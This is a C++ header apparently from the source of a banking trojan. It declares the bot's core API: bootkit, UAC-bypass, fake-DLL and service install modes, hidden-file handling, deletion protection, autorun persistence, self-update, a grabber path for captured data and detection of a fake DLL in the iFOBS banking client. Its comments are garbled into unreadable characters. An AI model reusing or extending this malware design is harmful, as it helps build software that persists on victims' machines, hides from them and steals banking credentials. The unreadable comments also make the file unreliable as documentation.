//---------------------------------------------------------------------------
//  �������� ������ ����, ������������ � ���� ������� ������
//---------------------------------------------------------------------------

#ifndef BotCoreH
#define BotCoreH
//---------------------------------------------------------------------------


//=============================================================
//  ������ ��������� �������� ��������� ���� ��� �������
//=============================================================
#ifndef INSTALL_BOT_AS_SERVICE
	//#define INSTALL_BOT_AS_SERVICE
#endif;




//=============================================================
//  ��������� �������� ������������ ���������� ��������
//  ������������
//=============================================================
#define USE_CURRENT_USER



// ���������� ������ ��� ������ � WINAPI � ����
#include "GetApi.h"

// ������ ��� ������ � �������
#include "Memory.h"

// ������ ��� ������ �� ��������
#include "Strings.h"

// ������ ����������
#include "Crypt.h"

// ������� ��������� ����
#include "Config.h"


// ������ ������� ������
#include "Utils.h"

// ������ ��� ������ � HTTP
#include "BotHTTP.h"


//*****************************************************************************
//  ���� ������ �� ���������� � ����� ����������
//  ���� ������ ������������� ������ ������
//  ������ ���������� � ���� ��� �������������� ������
//  �������� ���������� ����
//  ��-�� ���� �� ����������� ������������� ��������������
//  ������� ������ �� ����� ������ �������� ���� ������
//*****************************************************************************
#include "Modules.h"



//--------------------------------------------
// ������������ ���������� ����� ������� �����
// ������� ���
//--------------------------------------------
#define MAX_HIDDEN_FILES 15


//--------------------------------------------
// ��� ����
//--------------------------------------------
enum TBotType { BotRing3   = 0,
				BotService = 1,
				BotFakeDll = 2,
				BotBootkit = 3,
				BotBypassUAC = 4};


//--------------------------------------------
// ��� ����������� ��������
//--------------------------------------------
enum TProcessType { ProcessUnknown  = 0,
					ProcessExplorer = 1,
					ProcessLoader   = 2,
					ProcessService  = 3};





//***********************************************************
//  TBotApplication - ����� �������������� ������� �
//                    �������� �������� ����
//***********************************************************
class TBotApplication : public TBotObject
{
private:
	bool   FTerminated;
	DWORD  FPID;
    string FUID;
	string FApplicationName;
	string FPerfixFileName;

	string FGrabberPath;

public:
	TBotApplication();
	~TBotApplication();

	DWORD  PID();
	string UID();


	string ApplicationName(); // ��� ���������� � ������� �������� ���

	string PrefixFileName();  // ������� ���������� ��� ����� ��� �������� ��������
	string GrabberPath();     // ���� � �������� �������� ������� ������

	string CreateFile(const char* SubDir, const char* FileName);    // ������� ������ ���� � ������� �������� ����
	string CreateFile(const string &SubDir, const char* FileName);


	bool   FileExists(const char* SubDir, const char* FileName);    // ������� ��������� ������� ����� � ������� ����� ����
	bool   FileExists(const string &SubDir, const char* FileName);

	bool   Terminated();
};




//*****************************************************************************
//  Bot - ������ ��� ����������� ������ ���� ����
//*****************************************************************************
namespace BOT
{
	//----------------------------------------------------
	//  Initialize - ������� �������������� ����������
	//				 ��������� ����
	//----------------------------------------------------
    void Initialize(TProcessType ProcessType = ProcessUnknown);

	//�������������� ������ ������� ������ ������� API, ����� ��� ������� �� ��� �������
	//Initialize() �� �������� ��� ������ �� ��� �������, ������ �� ���������� ������ Bot = new TBotApplication();, ����� �������� ������
	void InitializeApi();


	//----------------------------------------------------
	// GetBotPath - ��� �o������� �������� ����
	//              � ���� �������� ����� ������ �����
	//              ������ ����� ����.
	//  ��� �����������, ��������� � ������ ������
	//  ������������ GetWorkPath()
	//----------------------------------------------------
	string GetBotPath();


	//-------------------------------------------
	// WorkPath - ������� ���������� ������ ����
	//            �������� �������� ����
	//-------------------------------------------
	string WorkPath();

	//-------------------------------------------
	// MakeFileName - ������� ���������� ��� ����
	//                ����� ������������� � �����
	//                ��������� �����
	//-------------------------------------------
	string MakeFileName(const char* SubDir, const char* FileName);
	string MakeFileName(const string &SubDir, const string &FileName);


	//----------------------------------------------------
	// ������� ���������� ������� ������� ����
	//
	// SubDir - ����������, ������� ����� �������� �
	//          ����������� ����������.
	//          �� ������ ���������� �� �����, �� ������
	//			�� �������������
	//
	// FileName - ��� �����, ������� ����� ��������� �
	//			  ����������� ��������
	//----------------------------------------------------
	PCHAR GetWorkPath(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkPathInSysDrive - ������ ������� GetWorkPath.
	//  	������� �� ����� �� ��� � ���, ��� �����
	//      �������� � ����� ���������� �����
	//----------------------------------------------------
	//PCHAR GetWorkPathInSysDrive(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkFolderHash - ������� ���������� ���
	//  	                   ����� ������� �����
	//----------------------------------------------------
   //	DWORD GetWorkFolderHash();

	//----------------------------------------------------
	//  GetBotFileName - ������� ���������� ��� ����� ����
	//----------------------------------------------------
	PCHAR GetBotExeName();

	//----------------------------------------------------
	//  GetBotLinkName - ������� ���������� ��� �����
	//     				 ������ ����
	//----------------------------------------------------
	//string GetBotLinkName();

	//----------------------------------------------------
	//  GetBotExeNameHash - ������� ���������� ��� ���
	//						����� ����
	//----------------------------------------------------
    DWORD GetBotExeNameHash();

	//----------------------------------------------------
	//  GetBotFullExeName - ������� ���������� ������ ���
	//						����� ����
	//----------------------------------------------------
	string GetBotFullExeName();

	//----------------------------------------------------
	//  GetServiceFullExeName - ������� ���������� ������
	//						    ��� ����� ������� ����
	//----------------------------------------------------
	string GetServiceFullExeName();


	//----------------------------------------------------
	// ������� �������� ��� ���� �� ��������
	//----------------------------------------------------
	void Protect(PCHAR FileName);

	//----------------------------------------------------
	// ������� ������� ������ � ��� ����� ����
	//----------------------------------------------------
	void Unprotect();


	//----------------------------------------------------
	// AddToAutoRun - ������� ��������� ��� � ������������
	//----------------------------------------------------
	bool AddToAutoRun(PCHAR FileName);


	//----------------------------------------------------
	// InstallService - ������� ����������� ��� ����
	//                  ��� ������
	// FileName - ��� ��� ����� ����
	//----------------------------------------------------
	bool InstallService(const char* FileName);

	//----------------------------------------------------
	// UninstallService - ������� �������������
	//                    ������ ����
	//----------------------------------------------------
	bool UninstallService();

	//----------------------------------------------------
	// UpdateService - ������� ��������� ��� �������
	//----------------------------------------------------
    bool UpdateService(const char* FileName);

	//----------------------------------------------------
	// ExecuteService - ������� ��������� ����������
	//                  �������
	//----------------------------------------------------
	void ExecuteService();


	//----------------------------------------------------
	// IsService - ������� ���������� ������ ����
	//             ������� ������� �������� ��������
	//----------------------------------------------------
	bool IsService();

	//----------------------------------------------------
	//  TryCreatBotInstance - ������� ���������� 
	//  ����� ��������, �� ������� �������� ��������
	//  �������� ��� ���� ��������� ������� ������.
	//----------------------------------------------------
	HANDLE TryCreateBotInstance();

	//������� ������� ��� �������, ���� ���������� 0, �� ������ ��� ���-�� ��� ������ 
	HANDLE CreateBootkitMutex();
	//���������� true, ���� ������� ��� �� ��� �������
	bool BootkitIsRun();

	//----------------------------------------------------
	//  IsRunning - ������� ���������� ������ ���� �
	//  ������� ��� ������� ��������� ����
	//----------------------------------------------------
	bool IsRunning();

	//----------------------------------------------------
	//  SendProcessMessage - ������� ���������� ���������
	//  ���������� ��������
	//----------------------------------------------------
	bool SendProcessMessage(TProcessType Process, const string &Mesage);


	//----------------------------------------------------
	//  Delete - ������� ������� ��� ����
	//----------------------------------------------------
    void Delete();

	// ������� ���� (����) ����
	// TimeOut - ����� (���� ���.) � ������� �������� ������� ����� ��������
	// ������� ����. ���� TimeOut == 0 �� ����� ����������� ���� �������
	//
	// DeleteAfterReboot - � ������ ������� ������ ������� � �������������
	// �������� ����� ����� ������

	bool DeleteBotFile( const char* FileName, DWORD TimeOut = 0, bool DeleteAfterReboot = true);

	//������� ���� �� ������������
	void DeleteAutorunBot();


	//----------------------------------------------------
	//  ������� �����������/�������� ��������� ����
	//----------------------------------------------------
	void SaveSettings(bool SavePrefix, bool SaveHosts, bool IgnoreIfExists);
	void DeleteSettings();

	void SavePrefixToTemporaryFile();
	void SavePrefixFromTemporaryFile(bool IgnoreIfExists);

	//----------------------------------------------------
	//  ������� ���������/��������� ���� ����
	//----------------------------------------------------
	void     SetBotType(TBotType Type);
	TBotType GetBotType();


	//----------------------------------------------------
	//  MakeUpdate - ������� ��������� ����
	//----------------------------------------------------
	bool MakeUpdate(const char *FileName, bool ResetSettings);



	#ifdef BOTPLUG
		// ������� ��������� ���� bot.plug
		bool UpdateBotPlug(BYTE* data, int c_data);
	#endif

   //----------------------------------------------------
   //  ������� ��� ����������� �������� ��������� ������
   //----------------------------------------------------
   void        AddHiddenFile(DWORD FileHash);
   void        AddHiddenFile(const char* FileName);
   void inline AddHiddenFile(const string& FileName) { AddHiddenFile(FileName.t_str()); }

   bool IsHiddenFile(DWORD FileHash);
   bool IsHiddenFile(const char* FileName);

   //���������� true, ���� ������� �����������
   bool FakeDllInstalled();
   bool FakeDllIFobsInstalled();

	//------------------------------------------
	//  GetFileName - ������� ���������� ���
	//                ����� ��������� ������
	//				  ������ ����
	//------------------------------------------
	PCHAR GetHostsFileName();

}

//��� ����, ���������������� � ������� BOT::Initialize(), ����� �������� ���� ����� ������� ������� 
//����� ������� SetBankingMode()
extern char BOT_UID[128];



//===================================================
//    ���������� ����� ���������� ����
//===================================================

extern TBotApplication* Bot;


//---------------------------------------------------------------------------
#endif
